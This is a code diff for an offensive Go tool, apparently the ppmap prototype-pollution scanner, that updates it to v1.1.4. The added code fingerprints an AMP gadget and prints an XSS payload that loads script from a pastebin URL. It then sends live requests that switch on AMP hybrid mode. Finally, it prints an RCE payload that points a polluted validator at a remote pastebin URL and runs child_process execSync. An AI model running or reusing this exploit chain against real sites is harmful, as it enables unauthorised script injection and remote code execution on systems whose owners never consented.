@@ -9,6 +9,8 @@ import (
     "github.com/chromedp/chromedp"
     "strings"
     "time"
+    "net/http"
+    "net/url"
 )
 
 //some fancy colour variables here
@@ -76,9 +78,11 @@ var fingerprint string = `(() => {
   } else if (typeof String.parseQueryString != 'undefined') {
     gadgets = "MooTools More";
   } else if (typeof mutiny != 'undefined') {
-    gadgets = "Mutiny"
+    gadgets = "Mutiny";
+  } else if (document.getElementsByTagName('html')[0].hasAttribute('amp')) {
+    gadgets = "AMP";
   } else if (typeof $ !== 'undefined' && typeof $.fn !== 'undefined' && typeof $.fn.jquery !== 'undefined') {
-    gadgets = 'jQuery ';
+    gadgets = 'jQuery';
   }
 
  return gadgets;
@@ -87,7 +91,7 @@ var fingerprint string = `(() => {
 
 func main() {
     fmt.Printf(`                                                                                 
-    dMMMMb  dMMMMb  dMMMMMMMMb  .aMMMb  dMMMMb     v1.1.3
+    dMMMMb  dMMMMb  dMMMMMMMMb  .aMMMb  dMMMMb     v1.1.4
    dMP.dMP dMP.dMP dMP"dMP"dMP dMP"dMP dMP.dMP 
   dMMMMP" dMMMMP" dMP dMP dMP dMMMMMP dMMMMP"  
  dMP     dMP     dMP dMP dMP dMP dMP dMP           
@@ -137,7 +141,7 @@ dMP     dMP     dMP dMP dMP dMP dMP dMP            @kleiton0x7e
         
         for index, payload := range payloads {
             _ = index
-            url := string(u) + string(quote) + string(payload)
+            full_url := string(u) + string(quote) + string(payload)
 
 	    opts := append(chromedp.DefaultExecAllocatorOptions[:],
 		//uncomment the following lines to setup a proxy
@@ -157,15 +161,15 @@ dMP     dMP     dMP dMP dMP dMP dMP dMP            @kleiton0x7e
             // run task list
             var res string
             err := chromedp.Run(ctx,
-                chromedp.Navigate(url),
+                chromedp.Navigate(full_url),
                 chromedp.Evaluate(`window.ppmap`, &res),
             )
             if err != nil {
-                log.Printf(Error + " %s", url)
+                log.Printf(Error + " %s", full_url)
                 continue
             }
 
-            log.Printf(Vulnerable + " %s", url)
+            log.Printf(Vulnerable + " %s", full_url)
             time.Sleep(1 * time.Second)
             //now its fingerprinting time
             log.Printf(Info + " Fingerprinting the gadget...")
@@ -275,6 +279,51 @@ dMP     dMP     dMP dMP dMP dMP dMP dMP            @kleiton0x7e
                log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "?constructor[prototype][test]=test")              
             } else if strings.Contains(string(res1), "Mutiny") {
                log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__.test=test")   
+            } else if strings.Contains(string(res1), "AMP") {
+               
+               log.Printf(Exploit + " Final XSS payload: " + string(u) + string(quote) + "__proto__.ampUrlPrefix=https://pastebin.com/raw/E9f7BSwb")              
+			   log.Printf(Info + " There might be an possible RCE exploit. Trying to leverage the impact...")
+               time.Sleep(3 * time.Second)
+               
+               //parsing the url
+			   link, err2 := url.Parse(u)
+			   if err2 != nil {
+			   	log.Fatal(err2)
+			   }
+               
+               //sending the first request
+               log.Printf(Info + " Sending a simple HTTP Request to target")
+               resp0, err0 := http.Get(string(link.Scheme) + "://" + string(link.Hostname()) + "/")
+               if err0 != nil{
+                 log.Fatalln(err0)
+               }
+               
+               //check if first request was considered valid by the server
+               if resp0.StatusCode >= 200 && resp0.StatusCode <= 399 {
+                 log.Printf(Info + " Payload 1 successfully sent")
+                 time.Sleep(1 * time.Second)
+               } else {
+                 log.Printf(Error + " Something went wrong. Please try again!")
+               }
+               
+               //sendint the second request with payload
+               log.Printf(Info + " Sending request to enable AMP...")
+               resp, err := http.Get(string(u) + string(quote) + "amp=1&__proto__.amp=hybrid")
+               if err != nil {
+                 log.Fatalln(err)
+               }
+               time.Sleep(2 * time.Second)
+                  
+               //check if the second request was considered valid by the server                   
+               if resp.StatusCode >= 200 && resp.StatusCode <= 399 {
+                 log.Printf(Info + " Payload 2 successfully sent")
+                 time.Sleep(3 * time.Second)
+                 log.Printf(Exploit + " Final RCE payload (use Windows to popup Calculator): " + string(u) + string(quote) + "__proto__.validator=https://pastebin.com/raw/2H8MHf2G")
+                 log.Printf(Info + ` Payload used: (this.constructor.constructor("return process.mainModule.require('child_process')")()).execSync('calc')`)
+               } else {
+                 log.Printf(Error + " Something went wrong. Please try again!")
+               }
+            
             } else {
                log.Printf(Error + " An unexcepted error occured")
             }
